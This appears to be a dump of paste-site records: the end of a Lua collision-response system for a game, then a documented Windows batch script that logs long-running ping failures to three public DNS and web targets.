			local globalPosition2 = GetEntityGlobalPosition(id2, world)
			local globalSize2 = GetEntityGlobalScale(id2, world) * collider2.Size
			local collisionTime, collisionNormal = sweptAABB(
				lastChange,
				lastPosition,
				globalSize1,
				globalPosition2,
				globalSize2
			)
			
			if collisionTime < minCollisionTime then
				minCollisionTime = collisionTime
				minCollisionNormal = collisionNormal
			end
		end
		
		local parentRotation = 0
		local parentPosition = Vector2.zero
		local parentScale = Vector2.one
		
		local newGlobalPosition = lastPosition + lastChange * minCollisionTime
		local newLocalPosition = globalToLocalPosition(id1, newGlobalPosition, world)
		
		local dotprod = (lastChange.X * minCollisionNormal.Y + lastChange.Y * minCollisionNormal.X) * (1 - minCollisionTime)
		
		world:insert(id1,
			transform1:patch({
				Position = newLocalPosition
			}),
			physics1:patch({
				LastPosition = newGlobalPosition
			}),
			velocity1:patch({
				Velocity = Vector2.new(
					dotprod * minCollisionNormal.Y,
					dotprod * minCollisionNormal.X
				)
			})
		)
	end
end

return {
	system = RespondToCollisions,
	after = {
		CheckCollisions,
		ApplyVelocity,
	},
}"
kx3erVw0,SlowPingTestV3.bat,Devanov,Batch,Sunday 14th of April 2024 09:26:37 AM CDT,":: |---------------------------------------------------------------------------------------------------|
:: | SPT3 - Slow Ping Test (Version 3)	          								   Created By: Devanov |
:: |---------------------------------------------------------------------------------------------------|
:: |
:: | 1. What is the script meant for?
:: |
:: |	To let run for extended periods (>30 days) on a windows device,
:: |	to monitor connections to pre-defined targets via ICMP-Ping requests
:: |	with the focus on logging occurances in a continous log-file.
:: |
:: | 2. Why is the script CMD-based?
:: |
:: |	The creator of this script is no programmer.
:: |	Furthermore, the script was meant to run with minimal requirements within windows OS.
:: |	It only relied on CMD, with later additions incorporating basic Powershell elements.
:: |	The focus of the script remained the logging and therefore the output, CMD ""ping"" generated.
:: |
:: | 3. Why am I getting an Access-Error on startup?
:: |
:: |	Before the script starts into the loop, it issues a request to resync the NTP (time) server.
:: |	This step is to ensure that the timestamps within the log-file are correct for the timezone.
:: |	The Time-Resync however requires administrative permissions.
:: |	It is suggested to execute as Admin, but not required.
:: |	The output of the issued command (wether successful or not) will be logged too.
:: |	Note: Before issuing this command, the script tries to start the w32time service required for NTP (silent).
:: |
:: | 4. What happens when the script is aborted/restarted? What if it is moved or the log deleted?
:: |
:: |	As the script only adds to the (existing) SlowPingTest.log file, there will be no data loss upon exiting.
:: |	But the script does not restart on its own if cancelled.
:: |	The script will always search for a log-file in the directory it is located in;
:: |	if not file is present, it will generate one. If one is present, it just adds content to it.
:: |
:: | 5. I want to change the ping-targets or the display name in the log.
:: |
:: |	Right click the .bat file and open in Editor (or Notepad++).
:: |	change values within the ""set"" commands. EXAMPLE:
:: |	set ""var1=YourFirstTargetName"" (Keep character-count same for var1,2,3 for log-readability)
:: |	set ""srv1=YourFirstTargetAddress"" (Can be IP or DNS)
:: |
:: | 6. I want to suppress the output in CLI (for RAM savings or silent executions).
:: |
:: |	Remove the following part of each ""single-long-line"" argument:
:: |	& powershell -command ""Get-Content %cd%\SlowPingTest.log | Select-Object -Last 1""
:: |	------------
:: |	Change this:
:: |	findstr ""%timeout% %error%"" ""%SPTTEMP%"" >nul && (set /p ""= %date% / %time% / %var1% / "" <nul >> ""%cd%\SlowPingTest.log"" & findstr ""%timeout% %error%"" ""%SPTTEMP%"" >> ""%cd%\SlowPingTest.log"" & powershell -command ""Get-Content %cd%\SlowPingTest.log | Select-Object -Last 1"")
:: |	To this (Please keep in mind to adjust %var1% if copy-pasting):
:: |	findstr ""%timeout% %error%"" ""%SPTTEMP%"" >nul && (set /p ""= %date% / %time% / %var1% / "" <nul >> ""%cd%\SlowPingTest.log"" & findstr ""%timeout% %error%"" ""%SPTTEMP%"" >> ""%cd%\SlowPingTest.log"")
:: |
:: |---------------------------------------------------------------------------------------------------|
:: | Date Of Update: 14.04.2024	     	             							  Original: 02.02.2023 |
:: |---------------------------------------------------------------------------------------------------|

@echo off
cd ""%~dp0""

set ""var1=Cloudflare""
set ""srv1=1.1.1.1""

set ""var2=Google-DNS""
set ""srv2=8.8.8.8""

set ""var3=Google.com""
set ""srv3=google.com""

set cooldown=0
:: Time delay between ping-request from srv1>2 and srv2>3 (default: 0) // Warning: Increasing this can cause issues if time between cycles isn't increased as well
:: Time delay between issued ""cylces"" of 3 requests is manually set at the last powershell-line of the script (logic: 60/15=4 -- 0,15,30,45) // Default: 15 (Alternative: 30,60)

set ""success=TTL""
set ""timeout=Anforderung Zielhost Zielnetz""
set ""error=Fehler""
set ""ntp=erfolgreich Fehler""
:: Please adjust variables based on OS language (Default: German)

set ""SPTTEMP=%cd%\SPT.temp""

echo ----------------
echo SlowPingTest.bat
echo ----------------
echo =====================================================================================>> %cd%\SlowPingTest.log
sc start w32time
echo | set /p=%date% / %time% / RESYNC-NTP />> %cd%\SlowPingTest.log & @w32tm /resync | findstr ""%ntp%"" >> %cd%\SlowPingTest.log
powershell -command ""Get-Content %cd%\SlowPingTest.log | Select-Object -Last 1"" 

:loop

setlocal
@ping %srv1% -l 0 -n 1 > ""%SPTTEMP%""
findstr ""%timeout% %error%"" ""%SPTTEMP%"" >nul && (set /p ""= %date% / %time% / %var1% / "" <nul >> ""%cd%\SlowPingTest.log"" & findstr ""%timeout% %error%"" ""%SPTTEMP%"" >> ""%cd%\SlowPingTest.log"" & powershell -command ""Get-Content %cd%\SlowPingTest.log | Select-Object -Last 1"")
endlocal

timeout %cooldown% /nobreak>nul
setlocal
@ping %srv2% -l 0 -n 1 > ""%SPTTEMP%""
findstr ""%timeout% %error%"" ""%SPTTEMP%"" >nul && (set /p ""= %date% / %time% / %var2% / "" <nul >> ""%cd%\SlowPingTest.log"" & findstr ""%timeout% %error%"" ""%SPTTEMP%"" >> ""%cd%\SlowPingTest.log"" & powershell -command ""Get-Content %cd%\SlowPingTest.log | Select-Object -Last 1"")
endlocal

timeout %cooldown% /nobreak>nul
setlocal
@ping %srv3% -l 0 -n 1 > ""%SPTTEMP%""
findstr ""%timeout% %error%"" ""%SPTTEMP%"" >nul && (set /p ""= %date% / %time% / %var3% / "" <nul >> ""%cd%\SlowPingTest.log"" & findstr ""%timeout% %error%"" ""%SPTTEMP%"" >> ""%cd%\SlowPingTest.log"" & powershell -command ""Get-Content %cd%\SlowPingTest.log | Select-Object -Last 1"")
endlocal

powershell -Command ""$waitSeconds = 15 - (Get-Date).Second %% 15; Start-Sleep -Seconds $waitSeconds""

goto loop"
